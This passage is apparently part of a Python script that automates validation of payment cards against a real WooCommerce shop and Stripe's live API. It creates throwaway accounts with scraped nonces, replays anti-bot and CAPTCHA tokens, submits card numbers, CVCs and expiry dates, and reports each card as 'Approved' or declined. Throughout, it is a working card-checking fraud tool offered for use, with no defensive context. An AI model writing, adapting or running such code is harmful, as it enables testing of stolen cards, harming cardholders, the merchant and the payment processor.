    'sec-ch-ua-platform': '"Android"',
  }

  response = r.get('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers)

  register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

  headers = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
      'Cache-Control': 'max-age=0',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://www.baileybox.com',
      'Referer': 'https://www.baileybox.com/my-account/',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': user,
      'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
  }

  data = {
      'username': username,
      'email': acc,
      'mailchimp_woocommerce_newsletter': '1',
      'woocommerce-register-nonce': register,
      '_wp_http_referer': '/my-account/',
      'register': 'Register',
      'ak_bib': '1725448457761',
      'ak_bfs': '1725448470119',
      'ak_bkpc': '6',
      'ak_bkp': '20;19;6,129;4;7;4,149;',
      'ak_bmc': '14;5,1906;20,2220;3,1393;8,7788;',
      'ak_bmcc': '5',
      'ak_bmk': '',
      'ak_bck': '',
      'ak_bmmc': '1',
      'ak_btmc': '6',
      'ak_bsc': '7',
      'ak_bte': '93;455,118;105,195;412,159;389,368;309,404;314,2227;38,179;343,1261;65,263;230,1719;57,217;81,1344;295,1864;88,5529;',
      'ak_btec': '15',
      'ak_bmm': '14,56;',
  }

  response = r.post('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers, data=data)


  headers = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
      'Connection': 'keep-alive',
      'Referer': 'https://www.baileybox.com/my-account/payment-methods/',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': user,
      'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
  }

  response = r.get('https://www.baileybox.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)

  nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
  print(nonce)


  headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
}

  data = f'type=card&owner[name]=+&owner[email]=vehtppq%40hi2.in&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d874578e-32e4-4c40-a99b-80394c4be464171962&muid=ea0aa864-2b3f-4abf-a7cf-dd8dc40b293bd74959&sid=116b2510-cbed-4f01-a45c-7c5cbc0632c675a26b&pasted_fields=number&payment_user_agent=stripe.js%2Fc710570bc1%3B+stripe-js-v3%2Fc710570bc1%3B+card-element&referrer=https%3A%2F%2Fwww.baileybox.com&time_on_page=39431&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiL2NhRytSc1lnSjAreldFY2QvUzMzcXpjc0c1WVZoMy9Mb2FOMG5qY3BUNmNzbXNYd0ZsaWkwMWIyblpnd0RMYW9VMlU5YmNpUjlUYmdYWkZOeEtPaThOT1pwR2pQOTE2TThvUC91RUVVK3I1emVNK3Y2c0tNbmJVckNUZ3h5dlVlZ0lCQWFjZ1VwQVVzaEdSQzcyTEJmV3JzUnZCTFMwWWcvSHlUVkhNUElhaFN1U0VKbVpkU3JVZlhLMHEzN0MvQ2IzcHMyNGJYVkhuZE1YMldxR05HVXJKUUZva2ZZampTdm1haTVKZ2dIZDZhc0RzSWJZWlcrZm5qM2E5UHdaeGlKeWFPU05JVGwwSXhubFNvblFQanM3YnVuc3ZEU2lNV0VzakVpbUFwSW1UN0k2ckJVb25LU214VGU1U2JFSEk0TERKbytSWUlTV2RxN3VKL3lYOWlUT0ZCUkk3b08yUHBHM3lWYnZ4dUQydlIzNUNVckY3NzFud1laUXpDeS9Mb3pEMmRNc3lMbUczWHA1YjBJalR0QlpBVTJoL0ZMNHJLZ1R2R3BwdkVRQStoVHB2UXVSWUw2WHJwRnBWd0lBWWxxMDB6WjFwWkZQYk96a1RQNTZMQnNRQzozWnRzVGdBNHJrTmQ2Z3ZpUGlXYmVuZ0F2dW5xODB6Y0xrMnpVOGN5ZjZkNS9MQk5yZmliYSsyK3RKbFpLNDB0QVdYM3BJZHU3K1c2cWorcXpEVmVFdG12U2ZKcjgxQkdnZ2xENkYrNFluK3VvcE5SeUIxK0VKUkIzMzI1L2xra21oblZwTkR4aG9HL0xOZFBjNHVQMjd1QU1rZm9EZlFkOXUrTjRRUFdkZ0x0L2Q4eGUxeEQxNG1UYzJrWmdsQzRMSm1HV2E0T3RHK0NNQVZ5QVZTSDh5U25DTnNLcHh2Q21KWG9EWTNSSVRmVVROc05MbzJRSEhDWi9QSlZoUUY4NVpZamlyVGlDaGNSekYwK25yUFIzWG95M2hPSHYwRmN0MjJnMWk1SEsvMzJySkRNMThKenhiZkRoRDN3czU5dkQzcktlbEMrVlY2TytDVnp5ckRHK2pETjFTTkk2N2tHTjhRdzhFQ0pqRjl3L3Y0a25TN3Z2WDhQOVpqcGZKYkpmaEdlMk8rdnB0b2MvbHJkUzFyUUV4K2Ewd1BQYjVoNTByVE95WkhKcGdXTmRZRXlTUzJqTXBxZi9aSzhoK1l1bWdBSXhWRDFWU21YL0VnOG1ZOFROSjBuWS81RmZhNklORHZlUTRZc21hU0JPcmlIb0Z4TmRkcUgva2JiMkI0ZzZ3bjhhenRLYk9jV1QrK2NhcGxHRndJdlVaRTl5cWJHMmF0bTFxeU14UkpHbDNuRk94MXFxRlpUVnRlbG4zU1V4OTR6Wko5V2tJcHByc0lEY252M2FmN2ZZMzZLdTJqdkpQd2JBNVlCQVN2cWlsVJKQjY5TVV6S3ZWM3VUNUh3YnpSWUpsR083U3NPR1RrV3JTOWJ1TFAySDRMd2xaeDRkc3NjdjRVZUlWMFpNZ2laKzBmbTdFZUJETXVLR09SdmFhQU5Da2YrLzJPVVNnMWZmelZYaWpwdXJRZmdHd3BHaFpiN2lVV2FlTGRYUXdacmxyREF4dlU2MXZwN0ROK24xNHJSY0RmRm5Da3o0VldibmI1bFJQYUxGRWtQWDAzTHg4N0ZJUzJ0K1kyT1MzREZXYWRSQk9JY3VRQnBheTVFbmlPNVBTN0R2WDNDUDQ2OS90cjVOaVVJOG83ZXdaT3U0Zk9xMnJvcm55N0poWFhnTWtQMi9ZWkpLK0RyN3gxdHNSaHRHSVNkTXVucUl5eXlYM09adDRINHI5dUNHSnNLUWk3YlRLUS9uVjRnaFY4NXBteUJUbGw2Z0gyOVlqRFc3dlBGL1BQR0R6c1RudGxEakRXcHpHNkp5OFpoRzFEL2hsUkRyOVBmNlZYTjJRWjkyb2pRMVRVY0lSOWttNGc1eEtTVytRcUFzN1JGN29pZzQySlVYVnlhc24vbjNwVXpDN1BNd0Y4eHg2MXNKZWRmV0swSmtHbko0dDVWWlJDUWo1R04ralU1dUVvTXZCTGxZV3JvQzNEb2hiTTQxbVk0YTVqTDVwWXFhdnZIOGt3VWpyd1hvT3dsNmNDSVFwOTZtNldzY1M4bGhXZVZIK3NQSTdOdjJETk96V3phUFlwUjZoUVRWWitYVVRCVVM2QkUwb1c1MlAwSVkzQTJ6MlJURC9sLzd1MDZFa3duek56WVNtZFh1L3Y4ZDYrS3lVTy9XT0JvVVBqM005M2ljcURPbnpkeHJ4aW1EdFhXektrcHNBN05HTUNFMFRIMktZVnFOYkR1NCsrc21RaXVYZ0RFN2FRREVSMUtBZ3hoZmZTMWZtai9waERXR2p4d055RDU1MFMvbnprcUtZNWcxVThXZXJSang3bUpvRHY4WnI5T2FFQnZHV3NiKytDWUlWZGRGNGt5T3VnYk4wYUtFME5HSmc5K1pJSjI5ZTloYmZxQkxxMU1sMVk4LzNGc1pNUTJiVFYrY0g0SmYxTmV3dUFUNC9YaFpkTDVod2szamxOVFNiTlk1b1VLbGFicVNUd0VFMTFDQVpJZ01mS0xBOGtHbW9uM0ViaWRNLzdHVUo0GRplsWERsbk9uQWtvdWFxZU5INlJzZi9TUFdQbWUwZWhZM0tTL1dPdTVWc1kvNG1WamVYV1N5STNYRGxVL2hZWSt1N2dDR1c4YUFnRE4wMVB1MXc0N1NENThPVzYvOGVEbkJkSzZPT0Rad05rODdBUkRaV25rQVBpaXU4OS9SbmVST2dFKzJhMXZ3PT0iLCJleHAiOjE3MjU1ODczMjIsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiMTFjOTg1NjMiLCJwZDI6MCwiY2RhdGEiOiJEVHhvZ2NZTVQvd3M2SnBtMUxoZXJiQkNZTWlSZEJKWlVyZzB5VW1rRFVUQnNhYWR0NkIzMUU2ZE1qeThCSVhEalU3ZkN3a2hqbldQelNWbENrZHFaUE90UnVSNktFbVJmTThmYndrcmJGUmRGUklwOGlVekliOXM1YWVIbTQwN29JRm9tT0JUZFRMcjFLRXZpbkVPc3JZQW9YUFRWTlJXQW80N3FUQ2pQT0piS3RPMUpHRzZ0cjllMUFmYUt0UEhjSDVROFZ2WGdwRzBKTFNZIn0.tWrB5mNXeRvZZpQ2SG-JH5dAUTwzAnmHZaHme1amnRI&key=pk_live_51HUGqfI9BolQkZWDB1L6wy1IWAxxumF7xYlt1LKuwPhpun0DERaQiGOH4UANnUlRM6LoXTmzvHKNaZevOFszeEzT00sc2dZpvN'

  response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)


  if not 'id' in response.json():
    print('ERORR CARD')
  else:
    id=response.json()['id']
    print(id)

  headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://www.baileybox.com',
    'Referer': 'https://www.baileybox.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': user,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

  params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
}

  data = {
    'stripe_source_id': id,
    'nonce': nonce,
}

  try:
    response = requests.post('https://www.baileybox.com/', params=params, cookies=r.cookies, headers=headers, data=data)
    i=(response.json()['error']['message'])
    return i
  except:
    print(response.json())
    return 'Approved'
